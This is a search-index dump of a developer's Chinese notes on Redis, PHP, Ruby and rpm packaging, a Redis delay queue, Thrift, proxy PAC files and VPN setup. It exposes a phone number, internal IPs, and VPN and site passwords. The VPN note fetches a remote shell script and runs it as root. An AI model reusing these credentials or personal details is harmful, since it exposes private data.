16:20:58 "},"redis/linux安装单一版.html":{"url":"redis/linux安装单一版.html","title":"安装","keywords":"","body":"安装 yum install -y redis vi /etc/redis.conf 配置密码： requirepass youpwd 查看配置密码: cat /etc/redis.conf |grep requirepass 启动redis: systemctl start redis Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"redis/php.html":{"url":"redis/php.html","title":"php连接集群","keywords":"","body":"php连接集群 $obj_cluster = new RedisCluster(NULL, ['10.81.128.152:7000', '10.81.128.152:7001' ,'10.81.128.152:7002','10.174.113.12:7003', '10.174.113.12:7004','10.174.113.12:7005', 1.5, 1.5]); var_dump($obj_cluster); $obj_cluster->set('name1', '1111'); $obj_cluster->set('name2', '2222'); $obj_cluster->set('name3', '333'); $name1 = $obj_cluster->get('name1'); $name2 = $obj_cluster->get('name2'); $name3 = $obj_cluster->get('name3'); var_dump($name1, $name2, $name3); zincrby: $this->redis->zincrby(\"comment:like\",$num,$comment_id); 加减$num值,如果值不存在，则会创建。 zscore： if($this->redis->zscore(\"comment:like\",$comment_id)) 判断值是否存在 list $insertArr=array(); $insertArr[\"siteid\"]=\"1062_1135\"; $insertArr[\"cname\"]=\"邹慧刚\"; $insertArr[\"sex\"]=\"男\"; $insertArr[\"telephone\"]=\"18516573852\"; $insertArr[\"birthday\"]=date(\"Y-m-d\",time()); $insertArr[\"adddate\"]=date(\"Y-m-d H:i:s\",time()); $json = json_encode($insertArr); $len1=$obj_cluster->rpush(\"pingan:insert\",$json); $insertArr=array(); $insertArr[\"siteid\"]=\"1062_11352\"; $insertArr[\"cname\"]=\"邹慧刚2\"; $insertArr[\"sex\"]=\"男\"; $insertArr[\"telephone\"]=\"18516573852\"; $insertArr[\"birthday\"]=date(\"Y-m-d\",time()); $insertArr[\"adddate\"]=date(\"Y-m-d H:i:s\",time()); $json = json_encode($insertArr); $len2=$obj_cluster->rpush(\"pingan:insert\",$json); echo $len1.\",\".$len2; //出队列 //$list=$obj_cluster->blPop(\"pingan:insert\",10);//在以上实例中，操作会被阻塞，如果指定的列表 key list1 存在数据则会返回第一个元素，否则在等待10秒后会返回 nil 。 /*brpop和blpop区别就是一个从一个从list末尾去数据.list开始出取数据,blpop和brpop取出数据之后会删除list中的数据, 如果这时候redis客户端挂了.那个数据就永远丢失了.redis提供了一种备用机制. BRPOPLPUSH 这个命令会先把pop出来的数据.存到指定的list.然后再把传递给redis客户端,多了一层保障 $data = $obj_cluster->bRPopLPush(\"pingan:insert\",\"pingan:tmp\",30); //这个一直返回false，用不了。 var_dump($data); //data1 //some process //$obj_cluster->lrem(\"pingan:tmp\",$data); */ // //出队列 //$list=$obj_cluster->blPop(\"pingan:insert\",10); 参考: http://www.cnblogs.com/sunshine-H/p/7922285.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"redis/没有.html":{"url":"redis/没有.html","title":"redis漏洞修复","keywords":"","body":"redis漏洞修复 http://www.alloyteam.com/2017/07/12910/ 设置密码，集群各个节点的密码需要一致: config set masterauth 新密码 config set requirepass 新密码 config rewrite 登录: redis-cli -h 10.81.128.152 -c -p 7002 -a 新密码 redis-cli -h 10.81.128.152 -c -p 7000 -a 新密码 redis-cli -h 10.81.128.152 -c -p 7001 -a 新密码 redis-cli -h 10.174.113.12 -c -p 7003 -a 新密码 redis-cli -h 10.174.113.12 -c -p 7004 -a 新密码 redis-cli -h 10.174.113.12 -c -p 7005 -a 新密码 连接一台redis: $r = new Redis(); $r->connect('reids服务器ip', 端口); try { if ($r->auth('认证密码')) { echo \"Successful authentication!\\n\"; } else { echo \"error: \" . $r->getLastError() . \"\\n\"; } /* Try a command anyway */ $r->get('foo'); } catch (Exception $ex) { echo \"phpredis exception: \" . $ex->getMessage() . \"\\n\"; } 连接redis集群: 貌似还不支持密码认证 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"rocketmq/install.html":{"url":"rocketmq/install.html","title":"RocketMQ消息队列的安装","keywords":"","body":"RocketMQ消息队列的安装 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"ruby/install.html":{"url":"ruby/install.html","title":"安装最新版本的ruby","keywords":"","body":"安装最新版本的ruby 下载地址: https://www.ruby-lang.org/en/downloads/ 安装: mkdir -p /home/ruby && cd /home/ruby wget https://cache.ruby-lang.org/pub/ruby/2.5/ruby-2.5.0.tar.gz tar xzvf ruby-2.5.0.tar.gz cd ruby-2.5.0 ./configure --prefix=/usr/local/ruby make sudo make install ./configure --prefix=/usr/local/ruby 是将ruby安装到指定目录，安装的时候开始没有使用root用户安装，出现问题，于是切换到root用户执行 make && make install 添加环境变量 vi /etc/profile 添加在最后添加 export RUBY_HOME=/usr/local/ruby export PATH=$PATH:$RUBY_HOME/bin 保存,然后刷新环境变量 source /etc/profile ruby -v 安装rubygems 下载rubygems: http://www.oschina.net/news/19237/rubygems-v-185 cd /home/ruby && wget http://production.cf.rubygems.org/rubygems/rubygems-1.8.5.tgz tar xzvf rubygems-1.8.5.tgz cd rubygems-1.8.5/ ruby setup.rb gem --version 问题汇总 Q1: [root@ceph-admin rubygems-1.8.5]# gem install fpm ERROR: Loading command: install (LoadError) cannot load such file -- zlib ERROR: While executing gem ... (NameError) uninitialized constant Gem::Commands::InstallCommand Did you mean? Gem::InstallUpdateOptions A1: #yum install -y gcc-c++ patch readline readline-devel zlib zlib-devel libyaml-devel libffi-devel openssl-devel #yum install -y make bzip2 #yum install -y iconv-devel yum install zlib-devel 如果安装不成功，可以更改yum源为阿里的源。 发现还是不行，查询发现需要，集成zlib库到ruby环境 cd /home/ruby/ruby-2.5.0 cd ext/zlib ruby extconf.rb //在操作下一步之前需要修改Makefile文件中的zlib.o: $(top_srcdir)/include/ruby.h,将$(top_srcdir)修改为../..如下 //zlib.o: ../../include/ruby.h //这一步如果不修改，make时会爆出另外一个错误 //make:*** No rule to make target `/include/ruby.h', needed by `zlib.o'. Stop make && make install 调试命令： gem install fpm --debug Q2: gem install fpm安装时，报错 ERROR: While executing gem ... (FrozenError) can't modify frozen String A2： gem update --system 查看版本: [root@mon1 zlib]# gem --version 2.7.6 Q3: ERROR: While executing gem ... (Gem::Exception) Unable to require openssl, install OpenSSL and rebuild Ruby (preferred) or use non-HTTPS sources A3: yum install openssl-devel cd /home/ruby/ruby-2.5.0/ext/openssl ruby extconf.rb //同样修改Makefile中的$(top_srcdir)为../.. make && make install 报错： make: No rule to make target /include/ruby.h', needed byossl.o'. Stop. make: No rule to make target /include/ruby.h', needed byossl_asn1.o'. Stop. vi Makefile 报错： 这个Makefile中有很多.o文件用上了$(top_srcdir) ，因此可在文件的第一行定义一下(在Makefile第一行添加)： top_srcdir = /home/ruby/ruby-2.5.0/include 参考文档： https://qiita.com/aTaroAsari/items/9be9f905772637fecef6 https://www.cnblogs.com/xjh713/p/7458437.html http://blog.csdn.net/feinifi/article/details/78251486 http://blog.csdn.net/kenera/article/details/6524557 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/deb.html":{"url":"software/deb.html","title":"将服务打包成ubuntu下可直接安装的程序","keywords":"","body":"将服务打包成ubuntu下可直接安装的程序 sudo apt-get install dh-make 配置文件: sudo vi DEBIAN/control: Package: ZphoneServer Version: 1.0.0 Section: gnome Priority: gnome Architecture: amd64 Depends: Maintainer: zouhuigang888@gmail.com Homepage: https://github.com/zouhuigang Description: zouhuigang zphone server 说明: Package: #包名 Version: #版本号 Section: gnome Priority: extra #优先级 Maintainer: name #维护者 Homepage: http://... #主页地址 Architecture: amd64 #这里添加 i386 amd64等参数 Depends: #如果存在依赖的库在这里填写 Description: #描述信息 sudo apt-get install ./package.deb Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/php-client/vendor/hprose/hprose/LICENSE.html":{"url":"software/php-client/vendor/hprose/hprose/LICENSE.html","title":"The MIT License (MIT)","keywords":"","body":"The MIT License (MIT) Copyright (c) 2008-2016 http://hprose.com Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/php-client/vendor/hprose/hprose/":{"url":"software/php-client/vendor/hprose/hprose/","title":"Hprose for PHP","keywords":"","body":"Hprose for PHP 图片 - Build Status Introduction Hprose is a High Performance Remote Object Service Engine. It is a modern, lightweight, cross-language, cross-platform, object-oriented, high performance, remote dynamic communication middleware. It is not only easy to use, but powerful. You just need a little time to learn, then you can use it to easily construct cross language cross platform distributed application system. Hprose supports many programming languages, for example: AAuto Quicker ActionScript ASP C++ Dart Delphi/Free Pascal dotNET(C#, Visual Basic...) Golang Java JavaScript Node.js Objective-C Perl PHP Python Ruby ... Through Hprose, You can conveniently and efficiently intercommunicate between those programming languages. This project is the implementation of Hprose for PHP. Hprose 2.0 for PHP Documents: https://github.com/hprose/hprose-php/wiki Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/php-client/vendor/hprose/hprose/README_zh_CN.html":{"url":"software/php-client/vendor/hprose/hprose/README_zh_CN.html","title":"Hprose for PHP","keywords":"","body":"Hprose for PHP 图片 - Build Status 简介 Hprose 是高性能远程对象服务引擎（High Performance Remote Object Service Engine）的缩写。 它是一个先进的轻量级的跨语言跨平台面向对象的高性能远程动态通讯中间件。它不仅简单易用，而且功能强大。你只需要稍许的时间去学习，就能用它轻松构建跨语言跨平台的分布式应用系统了。 Hprose 支持众多编程语言，例如： AAuto Quicker ActionScript ASP C++ Dart Delphi/Free Pascal dotNET(C#, Visual Basic...) Golang Java JavaScript Node.js Objective-C Perl PHP Python Ruby ... 通过 Hprose，你就可以在这些语言之间方便高效的实现互通了。 本项目是 Hprose 的 PHP 语言版本实现。 Hprose 2.0 for PHP 文档: https://github.com/hprose/hprose-php/wiki Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/rpm.html":{"url":"software/rpm.html","title":"初始化环境","keywords":"","body":"初始化环境 构建软件环境 yum install -y go #编译golang程序使用 yum install -y git go get github.com/hprose/hprose-golang go get github.com/zouhuigang/package/zphone/read go get github.com/zouhuigang/mahonia go get github.com/tealeg/xlsx 打包工具 ruby安装,参考此链接 gem install fpm $ fpm --version 1.9.3 开始构建程序并打包成rpm软件 1.创建软件工作路径 mkdir -p /usr/local/software/ && cd /usr/local/software/ 2.将source目录下的所有项目上传到/usr/local/software/目录下 3.构建并编译软件，这里用其中一个为例子： cd /usr/local/software/zphone $ ls phone.dat ZphoneServer.go ZphoneServer.service go build ZphoneServer.go 在目录下生成ZphoneServer文件。 软件生成完成，删除源代码，防止打包进了rpm包里面了： rm -rf ZphoneServer.go && mv ZphoneServer.service /usr/lib/systemd/system/ZphoneServer.service && chmod +x ZphoneServer 4.将ZphoneServer.service上传到/usr/lib/systemd/system/目录下，如需要更改软件路径，则需要修改ZphoneServer.service文件WorkingDirectory和ExecStart路径。 5.打包成rpm，制作软件包 cd /usr/local/software/zphone fpm -s dir -t rpm -n ZphoneServer -v 1.0.0 --config-files /usr/lib/systemd/system/ZphoneServer.service -f /usr/local/software/zphone 之后会在/usr/local/software/zphone目录下，生成ZphoneServer-1.0.0-1.x86_64.rpm 6.将ZphoneServer-1.0.0-1.x86_64.rpm下载到github.com/zouhuigang/software下，更新到github即可。 ZipServer-1.0.0-1.x86_64.rpm : cd /usr/local/software/zip && go build ZipServer.go rm -rf ZipServer.go && mv ZipServer.service /usr/lib/systemd/system/ZipServer.service && chmod +x ZipServer fpm -s dir -t rpm -n ZipServer -v 1.0.0 --config-files /usr/lib/systemd/system/ZipServer.service -f /usr/local/software/zip zsurname: cd /usr/local/software/zsurname && go build ZsurnameServer.go rm -rf ZsurnameServer.go && mv ZsurnameServer.service /usr/lib/systemd/system/ZsurnameServer.service && chmod +x ZsurnameServer fpm -s dir -t rpm -n ZsurnameServer -v 1.0.0 --config-files /usr/lib/systemd/system/ZsurnameServer.service -f /usr/local/software/zsurname zexcel: cd /usr/local/software/zexcel && go build ZexcelServer.go rm -rf ZexcelServer.go && mv ZexcelServer.service /usr/lib/systemd/system/ZexcelServer.service && chmod +x ZexcelServer fpm -s dir -t rpm -n ZexcelServer -v 1.0.0 --config-files /usr/lib/systemd/system/ZexcelServer.service -f /usr/local/software/zexcel 问题汇总： Q1： fpm -s dir -t rpm -n ZphoneServer -v 1.0.0 --config-files /usr/lib/systemd/system/ZphoneServer.service -f /usr/local/software/zphone 执行报错: Need executable 'rpmbuild' to convert dir to rpm {:level=>:error} A1: 出现这种情况就是需要安装rpm-build,安装yum install -y rpm-build.x86_64 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/source/znotify/":{"url":"software/source/znotify/","title":"Znotify处理异步任务（处理回调，短信/邮件的异步发送，异步通知等）","keywords":"","body":"Znotify处理异步任务（处理回调，短信/邮件的异步发送，异步通知等） 图片 - images http://www.10tiao.com/html/249/201703/2651959961/1.html 存储结构分析: Id：Job的唯一标识。用来检索和删除指定的Job信息。 notify_url: 回调的url Param：url的参数，供消费者做具体的业务处理，以json格式存储。 notify_state: 任务的状态,已过期任务会定时删除。 notify_state的状态: ready：可执行状态，等待消费。 delay：不可执行状态，等待时钟周期。 reserved：已被消费者读取，但还未得到消费者的响应（delete、finish）。 deleted：已被消费完成或者已被删除。 支付宝异步通知实现 支付宝异步通知时间间隔是如何实现的(通知的间隔频率一般是：2m,10m,10m,1h,2h,6h,15h) 订单支付成功后, 生成通知任务, 放入消息队列中. 任务内容包含Array{0,0,2m,10m,10m,1h,2h,6h,15h}和通知到第几次N(这里N=1, 即第1次). 消费者从队列中取出任务, 根据N取得对应的时间间隔为0, 立即发送通知. 第1次通知失败, N += 1 => 2 从Array中取得间隔时间为2m, 添加一个延迟时间为2m的任务到延迟队列, 任务内容仍包含Array和N 第2次通知失败, N += 1 => 3, 取出对应的间隔时间10m, 添加一个任务到延迟队列, 同上 ...... 第7次通知失败, N += 1 => 8, 取出对应的间隔时间15h, 添加一个任务到延迟队列, 同上 第8次通知失败, N += 1 => 9, 取不到间隔时间, 结束通知 延迟队列 原理: 利用Redis的有序集合，member为JobId, score为任务执行的时间戳, 每秒扫描一次集合，取出执行时间小于等于当前时间的任务. 整个延迟队列由4个部分组成： Job Pool用来存放所有Job的元信息。 Delay Bucket是一组以时间为维度的有序队列，用来存放所有需要延迟的／已经被reserve的Job（这里只存放Job Id）。 Timer负责实时扫描各个Bucket，并将delay时间大于等于当前时间的Job放入到对应的Ready Queue。 Ready Queue存放处于Ready状态的Job（这里只存放Job Id），以供消费程序消费。 举例说明一个Job的生命周期 用户对某个商品下单，系统创建订单成功，同时往延迟队列里put一个job。job结构为：{‘topic':'orderclose’, ‘id':'ordercloseorderNoXXX’, ‘delay’:1800 ,’TTR':60 , ‘body':’XXXXXXX’} 延迟队列收到该job后，先往job pool中存入job信息，然后根据delay计算出绝对执行时间，并以轮询(round-robbin)的方式将job id放入某个bucket。 timer每时每刻都在轮询各个bucket，当1800秒（30分钟）过后，检查到上面的job的执行时间到了，取得job id从job pool中获取元信息。如果这时该job处于deleted状态，则pass，继续做轮询；如果job处于非deleted状态，首先再次确认元信息中delay是否大于等于当前时间，如果满足则根据topic将job id放入对应的ready queue，然后从bucket中移除；如果不满足则重新计算delay时间，再次放入bucket，并将之前的job id从bucket中移除。 消费端轮询对应的topic的ready queue（这里仍然要判断该job的合理性），获取job后做自己的业务逻辑。与此同时，服务端将已经被消费端获取的job按照其设定的TTR，重新计算执行时间，并将其放入bucket。 消费端处理完业务后向服务端响应finish，服务端根据job id删除对应的元信息。 redis相关命令 ready queue: LRANGE dq_queue_notify 0 10 delay queue: zrange dq_bucket_1 0 10 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/source/znotify/编译.html":{"url":"software/source/znotify/编译.html","title":"生成znotify","keywords":"","body":"生成znotify ./build.bat 生成: ZnotifyServer fpm具体安装方法 将ZnotifyServer文件上传到服务器指定目录 mkdir -p /usr/local/software/znotify && cd /usr/local/software/znotify ZnotifyServer和env.ini上传到/usr/local/software/znotify目录下，并写入权限 chmod +x ZnotifyServer ZnotifyServer.service上传到/usr/lib/systemd/system目录下 cd /usr/local/software/znotify fpm -s dir -t rpm -n ZnotifyServer -v 1.0.1 --config-files /usr/lib/systemd/system/ZnotifyServer.service -f /usr/local/software/znotify 生成: ZnotifyServer-1.0.0-1.x86_64.rpm 把它上传到github目录。 https://github.com/zouhuigang/software Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"software/source/znotify/部署.html":{"url":"software/source/znotify/部署.html","title":"部署","keywords":"","body":"部署 占用端口:3336 cd ~ wget https://github.com/zouhuigang/software/raw/master/ZnotifyServer-1.0.1-1.x86_64.rpm yum localinstall -y ZnotifyServer-1.0.1-1.x86_64.rpm 修改env.ini文件中的redis配置，目录在: /usr/local/software/znotify/env.ini 启动 systemctl start ZnotifyServer systemctl status ZnotifyServer 如果执行失败，请注意赋予权限： cd /usr/local/software/znotify/ && chmod +x ZnotifyServer 卸载 systemctl stop ZnotifyServer yum remove -y ZnotifyServer Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"stress/jmeter.html":{"url":"stress/jmeter.html","title":"压力测试工具jmeter","keywords":"","body":"压力测试工具jmeter Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"thrift/":{"url":"thrift/","title":"golang","keywords":"","body":"golang 1、安装golang的Thrift包： go get git.apache.org/thrift.git/lib/go/thrift #go install git.apache.org/thrift.git/lib/go/thrift 安装 Thrift 的 IDL 编译工具 win:http://www.apache.org/dyn/closer.cgi?path=/thrift/0.10.0/thrift-0.10.0.exe linux:https://github.com/apache/thrift/archive/0.10.0.zip 下载完成，加入环境变量，查看是否安装成功 thrift -version 2.说明 client目录下的 client.go 实现了客户端用于发送数据并打印接收到 server 端处理后的数据 server 目录下的 server.go 实现了服务端用于接收客户端发送的数据，并对数据进行大写处理后返回给客户端 thrift_file 用于存放 thrift 的 IDL 文件： *.thrift 3.编译thrift文件 进入thrift_file目录,运行: thrift -out .. --gen go example.thrift 生成各个版本的库 thrift -r --gen go batu.thrift thrift -r --gen php batu.thrift thrift -r --gen php:server batu.thrift #生成PHP服务端接口代码有所不一样 问题: Q1: [root@localhost zexcel]# go run server.go # command-line-arguments ./server.go:40: cannot use handler (type *RpcServiceImpl) as type rpc.RpcService in argument to rpc.NewRpcServiceProcessor: *RpcServiceImpl does not implement rpc.RpcService (wrong type for FunCall method) have FunCall(int64, string, map[string]string) ([]string, error) want FunCall(context.Context, int64, string, map[string]string) ([]string, error) A1: the reason is your thrift version is different ， maybe you compile the thrift protocol using 0.9.2 version， but include the thrift library file is 1.0.0 version thrift编译工具的版本: [root@localhost zexcel]# thrift -version Thrift version 1.0.0-dev [root@localhost zexcel]# golang引用的代码的版本: [root@localhost thrift.git]# git branch -a * master remotes/origin/0.1.x remotes/origin/0.10.0 remotes/origin/0.11.0 remotes/origin/0.2.x remotes/origin/0.3.x remotes/origin/0.4.x remotes/origin/0.5.x remotes/origin/0.6.x remotes/origin/0.7.x remotes/origin/0.8.x remotes/origin/0.9.1 remotes/origin/0.9.2 remotes/origin/0.9.3 remotes/origin/0.9.x remotes/origin/HEAD -> origin/master remotes/origin/master remotes/origin/py-compiler [root@localhost thrift.git]# 切换到分支: git checkout -b 0.10.0 origin/0.10.0 参考文档 http://www.jianshu.com/p/a58665a38022 https://www.kancloud.cn/digest/batu-go/153528 https://www.36nu.com/post/248.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"vpn/ip pool/":{"url":"vpn/ip pool/","title":"代理服务器的好处","keywords":"","body":"代理服务器的好处 1.可以不断的更换自己的ip地址，隐藏自己的真实地址。 2.防止封掉爬虫 3.可以突破一些宽带的限制，有些运营商，如长城移动等运营商，限制一些ip不能访问一些网站。 windows下设置代理服务器 控制面板->Internet选项->连接->局域网设置->代理服务器 图片 - image 红方框内，分别填入代理服务器的ip和端口地址，即可。通过百度ip查询，代理服务器是否生效。 代理服务器地址获取方式: http://www.xicidaili.com/wn/ 需要关闭使用自动配置脚本，不然会不生效。 shadowsocks使用自动配置脚本的设置，是通过c#的SetIEProxy函数实现的。 Sysproxy.SetIEProxy(true, true, \"127.0.0.1:\" + config.localPort.ToString(), null); 其中:config.localPort.ToString()为1080端口 http://127.0.0.1:1080/pac?t=20180102094011054 PacUrl = $\"http://127.0.0.1:{config.localPort}/pac?t={GetTimestamp(DateTime.Now)}{PacSecret}\"; 上面的PacUrl即为使用自动配置脚本的代理地址。 https://github.com/shadowsocks/shadowsocks-windows/blob/e747805c369a322d06659e528cff7be7682e04f8/shadowsocks-csharp/Controller/System/SystemProxy.cs https://github.com/shadowsocks/shadowsocks-windows/blob/a08993519f7ee22696024a178e67df821eea448d/shadowsocks-csharp/Controller/Service/PACServer.cs golang版本的shadowsocks https://github.com/shadowsocks/shadowsocks-go 使用前，请先安装redis库 运行之后，查看redis keys * 图片 - image 参考文档: http://blog.csdn.net/qq_25504271/article/details/78608725 http://www.xicidaili.com/wn/ https://github.com/koofr/autoproxy.git Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"vpn/ip pool/pac/pac分析文件.html":{"url":"vpn/ip pool/pac/pac分析文件.html","title":"pac在win上的设置","keywords":"","body":"pac在win上的设置 github.com/getlantern/pac 执行的是，使用自动配置脚本,localhost:1080/pac： func main() { pacUrl := `localhost:1080/pac` //https://github.com/getlantern/pac-cmd cmd := exec.Command(`C:\\Users\\mdshi\\AppData\\Roaming\\byteexec\\pac-cmd.exe`, \"on\", pacUrl) //设置代理 out, err := cmd.CombinedOutput() if err != nil { fmt.Println(err) } fmt.Println(string(out)) } 相当于： func main3() { helperFullPath := \"pac-cmd\" iconFullPath, _ := filepath.Abs(\"./icon.png\") log.Debugf(\"Using icon at %v\", iconFullPath) err := pac.EnsureHelperToolPresent(helperFullPath, \"Input your password and save the world!\", iconFullPath) if err != nil { fmt.Printf(\"Error EnsureHelperToolPresent: %s\\n\", err) return } err = pac.On(\"localhost:12345/pac\") if err != nil { fmt.Printf(\"Error set proxy: %s\\n\", err) return } fmt.Println(\"proxy set, Enter continue...\") var i int fmt.Scanf(\"%d\\n\", &i) pac.Off(\"localhost:12345/pac\") } 全代码： package main import ( \"fmt\" \"github.com/getlantern/golog\" \"github.com/getlantern/pac\" \"os/exec\" \"path/filepath\" ) var log = golog.LoggerFor(\"example\") func main() { pacUrl := `localhost:1080/pac` //https://github.com/getlantern/pac-cmd cmd := exec.Command(`C:\\Users\\mdshi\\AppData\\Roaming\\byteexec\\pac-cmd.exe`, \"on\", pacUrl) //设置代理 out, err := cmd.CombinedOutput() if err != nil { fmt.Println(err) } fmt.Println(string(out)) } func main3() { helperFullPath := \"pac-cmd\" iconFullPath, _ := filepath.Abs(\"./icon.png\") log.Debugf(\"Using icon at %v\", iconFullPath) err := pac.EnsureHelperToolPresent(helperFullPath, \"Input your password and save the world!\", iconFullPath) if err != nil { fmt.Printf(\"Error EnsureHelperToolPresent: %s\\n\", err) return } err = pac.On(\"localhost:12345/pac\") if err != nil { fmt.Printf(\"Error set proxy: %s\\n\", err) return } fmt.Println(\"proxy set, Enter continue...\") var i int fmt.Scanf(\"%d\\n\", &i) pac.Off(\"localhost:12345/pac\") } 参考文档: https://github.com/getlantern/pac-cmd https://github.com/getlantern/byteexec https://github.com/getlantern/pac https://github.com/dawei101/tongsheClient.shadowsocks-go-ui Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"vpn/ip pool/pac/pac文件说明.html":{"url":"vpn/ip pool/pac/pac文件说明.html","title":"pac文件说明","keywords":"","body":"pac文件说明 什么是PAC 代理自动配置（英语：Proxy auto-config，简称PAC）是一种网页浏览器技术，用于定义浏览器该如何自动选择适当的代理服务器来访问一个网址。 一个PAC文件包含一个JavaScript形式的函数“FindProxyForURL(url, host)”。这个函数返回一个包含一个或多个访问规则的字符串。用户代理根据这些规则适用一个特定的代理其或者直接访问。当一个代理服务器无法响应的时候，多个访问规则提供了其他的后备访问方法。浏览器在访问其他页面以前，首先访问这个PAC文件。PAC文件中的URL可能是手工配置的，也可能是是通过网页的网络代理自发现协议（Web Proxy Autodiscovery Protocol）自动配置的。 图片 - image 简单的讲，PAC就是一种配置，它能让你的浏览器智能判断哪些网站走代理，哪些不需要走代理。用过Shadowsocks的朋友应该会知道， shadowsocks.exe 同级目录下有一个 pac.txt 文件，这正是我们本文刚刚所说的pac配置文件。 pac优势 PAC自动代理属于智能判断模式，相比全局代理，它的优点有： 不影响国内网站的访问速度，防止无意义的绕路 节省Shadowsocks服务的流量，节省服务器资源 控制方便 例如： https://pac.itzmx.com/abc.pac 帐号：root 密码：pac.itzmx.com 图片 - image ss的pac文件 http://127.0.0.1:1080/pac?t=20180103134557730 参考文档： http://www.banyuner.com/11407.html https://www.cnblogs.com/softidea/p/6194596.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"vpn/ip pool/v1/":{"url":"vpn/ip pool/v1/","title":"代理ip","keywords":"","body":"代理ip https://github.com/awolfly9/IPProxyTool https://github.com/wrfly/gus-proxy http://httpbin.org/get?show_env=1 https://segmentfault.com/q/1010000000150166/ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"vpn/readme.html":{"url":"vpn/readme.html","title":"搭建vpn服务器，方便翻墙或访问公司内网","keywords":"","body":"搭建vpn服务器，方便翻墙或访问公司内网 centos7: wget https://raw.githubusercontent.com/DanylZhang/VPS/master/CentOS7-pptp-host1plus.sh chmod +x ./CentOS7-pptp-host1plus.sh ./CentOS7-pptp-host1plus.sh -u zouhuigang -p 123456 运行成功： You can now connect to your VPN via your external IP 101.81.73.142 Username: zouhuigang Password: c72-rrb-yDH [root@localhost ~]# http://blog.csdn.net/zdy1127/article/details/50664736 http://www.win7china.com/html/15202.html https://www.youtube.com/watch?v=RpmCqxtZjCY http://www.ithtw.com/9246.html https://hub.docker.com/r/mobtitude/vpn-pptp/ http://www.kwor.cn/2017/04/pptp-vpn.html https://github.com/hwdsl2/docker-ipsec-vpn-server/blob/master/README-zh.md FROM ubuntu:16.04 MAINTAINER Przemek Szalko ENV DEBIAN_FRONTEND noninteractive RUN apt-get update && apt-get install -y pptpd iptables COPY ./etc/pptpd.conf /etc/pptpd.conf COPY ./etc/ppp/pptpd-options /etc/ppp/pptpd-options COPY entrypoint.sh /entrypoint.sh RUN chmod 0700 /entrypoint.sh ENTRYPOINT [\"/entrypoint.sh\"] CMD [\"pptpd\", \"--fg\"] 第二种安装方式 docker tag hwdsl2/ipsec-vpn-server registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/ipsec-vpn-server:latest docker tag registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/ipsec-vpn-server:latest hwdsl2/ipsec-vpn-server vpn.env文件说明： VPN_IPSEC_PSK=这里填一个随机字符串,随便输吧,32位以内 VPN_USER=这里输入vpn的登录名 VPN_PASSWORD=这里输入vpn的登录密码 首先在 Docker 主机上加载 IPsec NETKEY 内核模块： sudo modprobe af_key 将vpn.env上传到/root文件夹下面 docker run \\ --name ipsec-vpn-server \\ --env-file vpn.env \\ --restart=always \\ -p 500:500/udp \\ -p 4500:4500/udp \\ -v /lib/modules:/lib/modules:ro \\ -d --privileged \\ hwdsl2/ipsec-vpn-server 查看信息： docker logs ipsec-vpn-server 查看服务器状态 如需查看你的 IPsec VPN 服务器状态，可以在容器中运行 ipsec status 命令： docker exec -it ipsec-vpn-server ipsec status 或者查看当前已建立的 VPN 连接： docker exec -it ipsec-vpn-server ipsec whack --trafficstatus Android 启动 设置 应用程序。 在 无线和网络 部分单击 更多...。 单击 VPN。 单击 添加VPN配置文件 或窗口右上角的 +。 在 名称 字段中输入任意内容。 在 类型 下拉菜单选择 L2TP/IPSec PSK。 在 服务器地址 字段中输入你的 VPN 服务器 IP。 在 IPSec 预共享密钥 字段中输入你的 VPN IPsec PSK。 单击 保存。 单击新的VPN连接。 在 用户名 字段中输入你的 VPN 用户名。 在 密码 字段中输入你的 VPN 密码。 选中 保存帐户信息 复选框。 单击 连接。 VPN 连接成功后，会在通知栏显示图标。最后你可以到 这里 检测你的 IP 地址，应该显示为你的 VPN 服务器 IP。 ----win7连接vpn，点击-------- 我的问题： 